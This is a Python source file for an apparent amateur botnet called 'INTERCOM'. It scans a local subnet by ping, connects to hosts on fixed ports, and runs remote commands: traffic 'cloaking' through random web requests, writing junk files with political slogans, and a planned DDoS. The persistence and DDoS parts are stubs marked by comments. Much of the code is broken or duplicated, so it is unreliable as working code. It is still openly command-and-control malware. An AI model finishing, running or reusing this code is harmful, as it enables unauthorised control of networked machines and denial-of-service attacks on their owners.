import socket
import os
from os import system, name
import sys
from time import sleep
from datetime import datetime
import random
from tqdm import tqdm
import threading
import subprocess
import ipaddress
import requests as reqs
from getpass import getuser


def clear():
    system('cls')

def filegen():
    l = "generate files"


path_of_self = os.path.abspath(__file__)


striptest = "192.168.1.1"



cloaklist = list1 = ["https://google.com", "https://reddit.com", "https://youtube.com", "https://wikipedia.org", "https://microsoft.com", "https://apple.com", "https://www.youtube.com/watch?v=LGu-sUyp-58", "https://discordapp.com/jobs"]

startstr = """
.------..------..------..------..------..------..------..------.
|I.--. ||N.--. ||T.--. ||E.--. ||R.--. ||C.--. ||O.--. ||M.--. |
| (\/) || :(): || :/\: || (\/) || :(): || :/\: || :/\: || (\/) |
| :\/: || ()() || (__) || :\/: || ()() || :\/: || :\/: || :\/: |
| '--'I|| '--'N|| '--'T|| '--'E|| '--'R|| '--'C|| '--'O|| '--'M|
`------'`------'`------'`------'`------'`------'`------'`------'
"""


class functions:

    def start_cloak(self):
        for i in range (1,101):
            randlink = random.choice(cloaklist)
            reqs.get(randlink)
    
    def filegen(self, amount):
        for i in range(0, amount):
            namelists = ["all i wanna do is", "in this dream i created", "when i waaaas seventeen", "I WANTED TO BE", "i wanted to be....", "orange juice?"]
            extlist = [".txt", ".deb", ".orangejuice", ".oJ", ".letitgo", ".FREE_HONG_KONG", ".HUAWEI_IS_A_MAJOR_THREAT", ".FREE_HK", ".ABOLISH_THE_CP", ".It_was_a_prank_calm_tf_down", ".sorry_i_will_leave_now_i_guess_bro_sorry_like_jeezuuuuuuuuuuus"]
           
            randfile = random.choice(namelists)
            randext = random.choice(extlist)

            randcomplete = randfile + randext

            xsv = open(randcomplete, "w+")
            xsv.write("F.R.E.E H.O.N.G K.O.N.G N.O.W")
            xsv.close()

    def persistence(self):
        # Persistence for current user.
        lll = True
    
    def die(self):
        print("die")


functions = functions()

class jscripthandler:

    def comms(self):
        jsock = socket.socket()
        jsock.listen(5)
        jconn, jaddr = s.accept()
        while True:
            jdata = jconn.recv(1024).decode("utf-8")
            
            if jdata == "cloak":
                functions.start_cloak()
            
            if jdata == "filegen":
                functions.filegen(10)
            
            if jdata == "DIE":
                functions.die()
                










def start_cloak():
    for i in range (1,101):
        randlink = random.choice(cloaklist)
        reqs.get(randlink)

print(startstr)

cur_time = datetime.now()
s = socket.socket()

global cur_job

cur_job = "es null"

host = "0.0.0.0"
ports = [8066,1078,9875,7862,9809]

randport = random.choice(ports)

otherhostsalive = False

listip = ["192.168.1.2","192.168.1.3","192.168.1.4","192.168.1.5","192.168.1.6","192.168.1.7","192.168.1.8","192.168.1.9","192.168.1.10","192.168.1.11"]


class console:
    def log(self, excep, time):

        log = open("log.loginf", "w+")
        log.write(time)
        log.write(" ")
        log.write(excep)

console = console()



str_time = str(cur_time)


class scanner:

    def connhandler(self, host1):
        s1 = socket.socket()
        port1 = 8066
        port2 = 1078
        port3 = 9875
        port4 = 7862
        port5 = 9809
        port1str = str(port1)
        port2str = str(port2)
        port3str = str(port3)
        port4str = str(port4)
        port5str = str(port5)
        try:
            s1.settimeout(5)
            s1.connect((host1, port1))
            print("Connected on port " + port1str + " IP: " + host1)
            clear()
            print(startstr)
            while True:
                data = s1.recv(1024).decode("utf-8")
                if data == "snooze":
                    s1.send(bytes("snoozer", "utf-8"))
                    sleep(300)
                    pass

                if data == "cloak":
                    start_cloak() #on new thread
                    
                    pass

                if "ddos" in data:
                    x=12123
                    #distributed attack on included ip, all on port 7754 (new thread)
                    #.partion function
                    sleep(300)
                    pass
                if data == "filegen":
                    filegen()#new thread
                    sleep(10)
                    pass
        except Exception as e:
            print(port1str, " Is closed")
            print(e)
            pass
        try:
            s1.settimeout(5)
            s1.connect((host1, port2))
            print("Connected on port " + port2str + " IP: " + host1)
            clear()
            print(startstr)
            while True:
                data = s1.recv(1).decode("utf-8")
                if data == "snooze":
                    s1.send(bytes("snoozer", "utf-8"))
                    sleep(300)
                    pass

                if data == "cloak":
                    start_cloak()
                    
                    pass

                if "ddos" in data:
                    x=12123
                    #distributed attack on included ip, all on port 7754 (new thread)
                    #.partion function
                    sleep(300)
                    pass
                if data == "filegen":
                    filegen()#new thread
                    sleep(10)
                    pass
        except Exception as e:
            print(port2str + "is closed")
            print(e)
            pass

        try:
            s1.settimeout(5)
            s1.connect((host1, port3))
            print("Connected on port " + port3str + " IP: " + host1)
            clear()
            print(startstr)
            while True:
                data = s1.recv(1024).decode("utf-8")
                if data == "snooze":
                    s1.send(bytes("snoozer", "utf-8"))
                    sleep(300)
                    pass

                if data == "cloak":
                    start_cloak() #on new thread
                    
                    pass

                if "ddos" in data:
                    x=12123
                    #distributed attack on included ip, all on port 7754 (new thread)
                    #.partion function
                    sleep(300)
                    pass
                if data == "filegen":
                    filegen()#new thread
                    sleep(10)
                    pass
        except Exception as e:
            print(port3str, " Is closed")
            print(e)
            pass

        try:
            s1.settimeout(5)
            s1.connect((host1, port4))
            print("Connected on port " + port4str + " IP: " + host1)
            clear()
            print(startstr)
            while True:
                data = s1.recv(1024).decode("utf-8")
                if data == "snooze":
                    s1.send(bytes("snoozer", "utf-8"))
                    sleep(300)
                    pass

                if data == "cloak":
                    start_cloak() #on new thread
                    
                    pass

                if "ddos" in data:
                    x=12123
                    #distributed attack on included ip, all on port 7754 (new thread)
                    #.partion function
                    sleep(300)
                    pass
                if data == "filegen":
                    filegen()#new thread
                    sleep(10)
                    pass
        except Exception as e:
            print(port4str, " Is closed")
            pass

        try:
            s1.settimeout(5)
            s1.connect((host1, port5))
            print("Connected on port " + port5str + " IP: " + host1)
            clear()
            print(startstr)
            while True:
                data = s1.recv(1024).decode("utf-8")
                if data == "snooze":
                    s1.send(bytes("snoozer", "utf-8"))
                    sleep(300)
                    pass

                if data == "cloak":
                    start_cloak() #on new thread
                    print("cloaking")
                    
                    pass

                if "ddos" in data:
                    x=12123
                    #distributed attack on included ip, all on port 7754 (new thread)
                    #.partion function
                    sleep(300)
                    pass
                if data == "filegen":
                    filegen()#new thread
                    sleep(10)
                    pass
        except Exception as e:
            print(port5str, " Is closed")
            pass
        





    def scanforhost(self):
        intip = 3232235777
        for i in tqdm(range(30)):
            intasstring = ipaddress.ip_address(intip).__str__()           
            
            process = subprocess.Popen("ping " + intasstring, stdout=subprocess.PIPE)
            output = process.stdout.read().lower()
            outputstr = str(output)
            if "unreachable" in outputstr:
                intip +=1
                pass
            else:
                passable = outputstr.split(" ")[1]
                print(passable)
                scanner.connhandler(passable)
                intip +=1
        handler.startserver()
                
            


class Handler:

    def startserver(self):
        print("Starting LAN Server...")
        s.bind((host, randport))
        f = s.getsockname()
        print(f"Server on port {f} ")
        s.listen(5)
        conn, addr = s.accept()
        print(f"{addr} Connected Succesfully")
        clear()
        print(startstr)
        print("Running In Server Mode")
        while True:
            try:
                conn.send(bytes("cloak", "utf-8"))
                print("Sent Random Packet")
                data = conn.recv(1024).decode("utf-8")
                print("received ",data)
                clear()
                print(startstr)
                print("Running In Server Mode")
                sleep(300)
            except Exception as e:
                strexcep = str(e)
                if "closed" in strexcep:
                    print("A connection was forcibly closed, logging")
                    console.log(e, cur_time)
                
                else:
                    print(e)
                    print("logging")
                
            
               
            

handler = Handler()
scanner = scanner()


argvstr = str(sys.argv)

if len(sys.argv) > 1:
    if "server" in argvstr:
        handler.startserver()
    if "client" in argvstr:
        scanner.scanforhost()
    
else:
    pass



scanner.scanforhost()

##wal = "192.168.1.5"

##res = [ele for ele in listip if(ele in wal)]
##stres = str(res)
##print(stres)
